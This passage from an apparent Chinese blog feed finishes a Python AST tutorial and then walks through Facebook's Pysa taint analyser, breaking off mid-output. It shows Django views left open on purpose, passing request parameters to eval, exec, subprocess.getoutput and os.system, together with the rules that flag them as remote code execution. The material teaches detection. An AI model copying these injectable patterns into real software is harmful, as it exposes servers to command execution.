class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeVisitor</span>(<span class="params">ast.NodeVisitor</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit_BinOp</span>(<span class="params">self, node</span>):</span> <span class="comment"># 修改操作符</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.op, ast.Mod):</span><br><span class="line">            node.op = ast.Add()</span><br><span class="line">        self.generic_visit(node) <span class="comment"># 遍历子节点</span></span><br><span class="line"></span><br><span class="line">visitor = NodeVisitor()</span><br><span class="line">visitor.visit(f_ast) <span class="comment"># 遍历</span></span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">odd:  0</span><br><span class="line">odd:  1</span><br></pre></td></tr></table></figure></li><li><p>删除 <code>else</code> 节点</p><ul><li>调用 <code>compile()</code> 函数时缺失 <code>lineno</code> 和 <code>col_offset</code> 属性，使用 <code>ast.fix_missing_locations</code> 函数添加</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeTransformer</span>(<span class="params">ast.NodeTransformer</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">visit_If</span>(<span class="params">self, node</span>):</span></span><br><span class="line">        <span class="keyword">return</span> ast.If(</span><br><span class="line">            test=node.test,</span><br><span class="line">            body=node.body,</span><br><span class="line">            orelse=[]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">transformer = NodeTransformer()</span><br><span class="line">f_ast = transformer.visit(f_ast) <span class="comment"># 返回新的 AST</span></span><br><span class="line">ast.fix_missing_locations(f_ast)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">even:  0</span><br></pre></td></tr></table></figure></li></ol><h2 id="可视化-AST"><a href="#可视化-AST" class="headerlink" title="可视化 AST"></a>可视化 AST</h2><p>使用 graphviz 绘制，遍历 AST 节点，将每个节点对象的类型名称作为点，父节点和每个子节点都连一条边。</p><div class="note info flat"><ol><li><p>安装 graphviz 二进制程序 👉 <a href="https://graphviz.org/download/">https://graphviz.org/download/</a></p></li><li><p>pip 安装包</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install graphviz</span><br></pre></td></tr></table></figure></li></ol></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visit</span>(<span class="params">node, nodes, pindex, g</span>):</span></span><br><span class="line">    name = <span class="built_in">str</span>(<span class="built_in">type</span>(node).__name__)</span><br><span class="line">    index = <span class="built_in">len</span>(nodes)</span><br><span class="line">    nodes.append(index)</span><br><span class="line">    g.node(<span class="built_in">str</span>(index), name)</span><br><span class="line">    <span class="keyword">if</span> index != pindex:</span><br><span class="line">        g.edge(<span class="built_in">str</span>(index), <span class="built_in">str</span>(pindex))</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> ast.iter_child_nodes(node):</span><br><span class="line">        visit(n, nodes, index, g)</span><br><span class="line">    </span><br><span class="line">graph = Digraph(<span class="built_in">format</span>=<span class="string">&quot;png&quot;</span>)</span><br><span class="line">tree = ast.parse(data)</span><br><span class="line">visit(tree, [], <span class="number">0</span>, graph)</span><br><span class="line">graph.render(<span class="string">&quot;test&quot;</span>)</span><br></pre></td></tr></table></figure><p>得到的 test.png 如下：</p><img src="https://i.loli.net/2021/07/15/3lrJHjtdRuTW9oY.png"><h1 id="参阅"><a href="#参阅" class="headerlink" title="参阅"></a>参阅</h1><ul><li><a href="https://kamneemaran45.medium.com/python-ast-5789a1b60300">Python AST</a></li><li><a href="https://devguide.python.org/compiler/">25. Design of CPython’s Compiler</a></li><li><a href="https://docs.python.org/zh-cn/3/c-api/code.html">代码对象</a></li><li><a href="https://docs.python.org/zh-cn/3/library/ast.html">ast — 抽象语法树</a></li><li><a href="https://docs.python.org/zh-cn/3/library/py_compile.html">py_compile — 编译 Python 源文件</a></li><li><a href="https://docs.python.org/zh-cn/3/library/dis.html">dis — Python 字节码反汇编器</a></li><li><a href="https://qiita.com/kaityo256/items/e83b369ba7518da0a519">Pythonの抽象構文木をGraphvizで可視化する</a></li></ul>]]></content>
    
    
    <summary type="html">使用 ast 模块操作抽象语法树，修改/替换节点。</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Pyre 污点分析工具 Pysa 使用教程</title>
    <link href="https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/"/>
    <id>https://jckling.github.io/2021/07/07/Security/Pysa%20Tutorial/</id>
    <published>2021-07-07T03:39:19.000Z</published>
    <updated>2021-07-12T11:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由 Facebook 开源的 <a href="https://github.com/facebook/pyre-check">Pyre</a> 是兼容 <a href="https://www.python.org/dev/peps/pep-0484/">PEP 484</a> 的 Python 性能类型检查器，可以增量分析大型代码库，能够迅速处理百万级别的代码。Pyre 附带了 Pysa，一个关注安全性的静态分析工具，Pysa 是 Python Static Analyzer 的缩写，Pysa 支持追踪和分析 Python 程序中的数据流（污点分析）。</p><p>此外还有一个 <a href="https://github.com/facebook/sapp">SAPP</a> (Static Analysis Post Processor) 静态分析后置处理器，提供命令行和 UI 检索 Pysa 的执行结果。</p><p>关于 Python 的类型（<a href="https://www.python.org/dev/peps/pep-0484/">PEP 484</a>），建议阅读 <a href="https://github.com/python/mypy">mypy</a> 的 <a href="https://mypy.readthedocs.io/en/stable/cheat_sheet_py3.html">清单</a> 和 <a href="https://mypy.readthedocs.io/en/stable/builtin_types.html">类型参考</a> 。下面就是没有添加和添加了类型注释的两个函数，Python3.5 开始支持可选的类型注释，这个特性极大地方便了对 Python 程序进行静态分析，不过就我看到的开源工具很少有添加类型注释的…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unannotated</span>():</span>        <span class="comment"># implictly returns `Any`</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;&quot;</span> + <span class="string">&quot;&quot;</span>       <span class="comment"># function body is not checked</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">annotated</span>() -&gt; List:</span>  <span class="comment"># explicit return annotation means we type check `annotated`</span></span><br><span class="line">    <span class="built_in">any</span> = unannotated()</span><br><span class="line">    <span class="built_in">any</span>.attribute         <span class="comment"># `Any` has all possible attributes</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>              <span class="comment"># Error: returning `int` but expecting `List`</span></span><br></pre></td></tr></table></figure><p>Pysa 跟踪数据流，用户定义源点（产生数据的地方）和汇点（来自源点的数据不应该结束的地方），当源点和汇点相交时就产生了问题</p><ul><li>最常见的数据源点就是用户控制的输入</li><li>汇点比较多样，包括各种 API</li></ul><img src="https://i.loli.net/2021/07/08/wNPmpHqg1WKh9Cr.jpg" width=80%><p>Pysa 执行的是过程间分析，即跟踪跨函数调用的数据流（污点分析），使用代码中的所有可用信息，包括可选的静态类型信息。Pyre 能够为源码添加类型信息，它本身的作用就是静态类型检查器。</p><p>局限</p><ol><li><p>问题空间</p><p> Pysa 只能追踪从 admin_operation 到 delete_user 的数据流，无法检查 user_is_admin</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_operation</span>(<span class="params">request: HttpRequest</span>):</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> user_is_admin():</span><br><span class="line">      <span class="keyword">return</span> Http404</span><br><span class="line"> </span><br><span class="line">  delete_user(request.GET[<span class="string">&quot;user_to_delete&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>Python 的动态特性</p><p> Pysa 无法识别动态导入的模块函数调用</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret_eval</span>(<span class="params">request: HttpRequest</span>):</span></span><br><span class="line">  os = importlib.import_module(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Pysa won&#x27;t know what &#x27;os&#x27; is, and thus won&#x27;t</span></span><br><span class="line">  <span class="comment"># catch this remote code execution issue</span></span><br><span class="line">  os.system(request.GET[<span class="string">&quot;command&quot;</span>])</span><br></pre></td></tr></table></figure></li><li><p>装饰器</p><p> 2020.8.7 Facebook 博客指出暂不支持在调用图中包括装饰器</p></li></ol><p>Facebook 提供了 Pysa 的教程 👉 <a href="https://github.com/facebook/pyre-check/tree/master/documentation/pysa_tutorial">Pysa Tutorial</a> ，涵盖几个主要的内容，进行实验的过程中遇到的一些问题也都磕磕绊绊地解决了。</p><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>Pysa 使用 <code>pyre analyze</code> 调用，实验中涉及到以下几个配置文件和工具：</p><p><code>taint.config</code> </p><ul><li>定义污点的源（source）和汇（sink），还包括隐式的源和汇</li><li>检测规则（rule），例如，从某源点到某汇点是 XXX 攻击，一条规则中可以包含多个源和汇</li><li>特征（feature）：污点的附加元数据，可用于过滤误报</li></ul><p><code>.pysa</code> </p><ul><li>污点模型，表示哪里是源点和汇点（利用签名），使用完全限定名，格式必须匹配 <code>.pyi</code> 存根文件<ul><li><code>TaintSource[SOURCE_NAME]</code> 标记源点</li><li><code>TaintSink[SINK_NAME]</code> 标记汇点</li><li><code>TaintInTaintOut</code> 标记污点进入进出，指的是进入函数的污点传播到返回值中</li><li><code>PartialSink</code> 标记组合源，使用规则名称</li></ul></li><li>消毒器（Sanitizer）表示对象的变化，经过消毒器污点就被净化，不再跟踪<ul><li>使用装饰器声明函数为消毒器</li><li>可以限定范围：源（source）、汇（sink）、污点进污点出（taint-in-taint-out, TITO）</li></ul></li></ul><p><code>.pyre_configuration</code></p><ul><li>路径配置：源代码、存根文件等</li></ul><p>SAPP</p><ul><li>交互式命令行</li><li>Web 服务器</li></ul><p>动态生成污点模型</p><ul><li><a href="https://github.com/facebook/pyre-check/tree/master/tools/generate_taint_models">pyre-check/tools/generate_taint_models/get_*.py</a> 包含预定义的一些生成器</li><li>遵循模型领域特定语言（Domain Specific Language, DSL）</li></ul><h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><p>实验环境： Ubuntu 20.04 Server + Python 3.8.10 + pip 20.0.2</p><p>在 Python 虚拟环境中进行实验</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/facebook/pyre-check.git</span><br><span class="line"><span class="built_in">cd</span> pyre-check</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装虚拟环境</span></span><br><span class="line"><span class="built_in">cd</span> documentation/pysa_tutorial</span><br><span class="line">python -m venv tutorial</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> tutorial/bin/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">pip install pyre-check fb-sapp</span><br></pre></td></tr></table></figure><div class="note danger flat"><p>如果这里遇到 Error 可以更新一下工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install wheel</span><br><span class="line">python -m pip install --upgrade setuptools</span><br></pre></td></tr></table></figure></div><h2 id="exercise1"><a href="#exercise1" class="headerlink" title="exercise1"></a>exercise1</h2><p>views.py 存在远程代码执行（Remote Code Execution, RCE）漏洞。Pysa 需要知道 <code>request.GET</code> 包含用户控制的数据，<code>eval</code> 可以执行代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config 编写规则，告诉 Pysa 当 CustomUserControlled 源点数据到达 CodeExecution 汇点时会引发 RCE 。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CustomUserControlled&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate user input&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of python code&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="number">5001</span>,</span><br><span class="line">      <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;CodeExecution&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a code execution sink&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sources_sinks.pysa 告诉 Pysa <code>request.Get</code> 是 <code>CustomUserControlled</code> 类型的污点源点 <code>TaintSource</code>，而 <code>eval</code> 是 <code>CodeExecution</code> 代码执行类型的污点汇点 <code>TaintSink</code> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.GET: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def eval(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br></pre></td></tr></table></figure><p>.pyre_configuration 配置了搜索的路径。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;source_directories&quot;</span>: [ <span class="comment">// 查找源码的目录</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;taint_models_path&quot;</span>: [ <span class="comment">// 查找 .pysa/taint.config 文件的目录</span></span><br><span class="line">    <span class="string">&quot;.&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;search_path&quot;</span>: [  <span class="comment">// 查找存根文件</span></span><br><span class="line">    <span class="string">&quot;../../../stubs/&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;exclude&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;.*/integration_test/.*&quot;</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;use_command_v2&quot;</span>: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体的执行结果如下，最后输出的 JSON 数组给出了问题列表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">(tutorial) jck@analysis:~/pyre-check/documentation/pysa_tutorial/exercise1$ pyre analyze</span><br><span class="line">ƛ No cached overrides loaded, computing overrides...</span><br><span class="line">ƛ `google.protobuf.message.Message.ClearField` has 57 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `google.protobuf.message.Message.__init__` has 58 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `object.__eq__` has 82 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `object.__init__` has 754 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `object.__ne__` has 60 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `type.__call__` has 131 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `type.__init__` has 448 overrides, this might slow down the analysis considerably.</span><br><span class="line">ƛ `type.__new__` has 75 overrides, this might slow down the analysis considerably.</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;line&quot;</span>: 12,</span><br><span class="line">    <span class="string">&quot;column&quot;</span>: 18,</span><br><span class="line">    <span class="string">&quot;stop_line&quot;</span>: 12,</span><br><span class="line">    <span class="string">&quot;stop_column&quot;</span>: 35,</span><br><span class="line">    <span class="string">&quot;path&quot;</span>: <span class="string">&quot;views.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;code&quot;</span>: 5001,</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="string">&quot;description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;long_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;concise_description&quot;</span>:</span><br><span class="line">      <span class="string">&quot;Possible RCE: [5001]: User specified data may reach a code execution sink&quot;</span>,</span><br><span class="line">    <span class="string">&quot;inference&quot;</span>: null,</span><br><span class="line">    <span class="string">&quot;define&quot;</span>: <span class="string">&quot;views.operate_on_twos&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="exercise2"><a href="#exercise2" class="headerlink" title="exercise2"></a>exercise2</h2><p>views.py 三个函数都存在远程执行漏洞，前两个执行 python 代码，最后一个执行 shell 代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpRequest, HttpResponse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_twos</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.POST[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = <span class="built_in">eval</span>(<span class="string">f&quot;2 <span class="subst">&#123;operator&#125;</span> 2&quot;</span>)  <span class="comment"># noqa: P204</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_threes</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    exec(<span class="string">f&quot;result = 3 <span class="subst">&#123;operator&#125;</span> 3&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># noqa: F821</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">operate_on_fours</span>(<span class="params">request: HttpRequest</span>) -&gt; HttpResponse:</span></span><br><span class="line">    operator = request.GET[<span class="string">&quot;operator&quot;</span>]</span><br><span class="line">    result = subprocess.getoutput(<span class="string">f&quot;expr 4 <span class="subst">&#123;operator&#125;</span> 4&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>taint.config 规则中已经添加了名称为 <code>ShellExecution</code> 的汇点。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;sources&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CustomUserControlled&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate user input&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;sinks&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CodeExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of python code&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ShellExecution&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;comment&quot;</span>: <span class="string">&quot;use to annotate execution of shell scripts&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;features&quot;</span>: [],</span><br><span class="line"></span><br><span class="line">  <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;code&quot;</span>: <span class="number">5001</span>,</span><br><span class="line">      <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;CodeExecution&quot;</span> ],</span><br><span class="line">      <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a code execution sink&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 taint.config 中添加一个 <code>CustomUserControlled</code> 源点到 <code>ShellExecution</code> 汇点的规则，将 code 定义为 5002 。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;rules&quot;: [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Possible RCE:&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;code&quot;</span>: <span class="number">5002</span>,</span><br><span class="line">    <span class="attr">&quot;sources&quot;</span>: [ <span class="string">&quot;CustomUserControlled&quot;</span> ],</span><br><span class="line">    <span class="attr">&quot;sinks&quot;</span>: [ <span class="string">&quot;ShellExecution&quot;</span> ],</span><br><span class="line">    <span class="attr">&quot;message_format&quot;</span>: <span class="string">&quot;User specified data may reach a shell execution sink&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>sources_sinks.pysa 包含带有污点注释的模型，这些模型必须匹配 <code>.pyi</code> 存根文件中的存根或源码。将 <code>.pyi</code> 存根或源码转换为模型时，必须确保：</p><ul><li>函数名不变</li><li>参数名不变</li><li>删除类型注释</li><li>函数或属性是完全限定的</li></ul><p>Pyre 的主要存根来自于 <a href="https://github.com/python/typeshed">typeshed</a>（包含 Python 标准库和 Python 内置包的外部类型注释，以及项目外部人员贡献的第三方包）。还有一部分是为 Pysa 编写的存根，涵盖 Django 等第三方库，不包含在 typeshed 中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.GET: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def eval(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br><span class="line"></span><br><span class="line">def subprocess.getoutput(cmd: TaintSink[ShellExecution]): ...</span><br></pre></td></tr></table></figure><p>添加规则，指明使用源点和汇点的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">django.http.request.HttpRequest.POST: TaintSource[CustomUserControlled] &#x3D; ...</span><br><span class="line"></span><br><span class="line">def exec(__source: TaintSink[CodeExecution], __globals, __locals): ...</span><br></pre></td></tr></table></figure><p>执行 <code>pyre analyze</code> ，结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 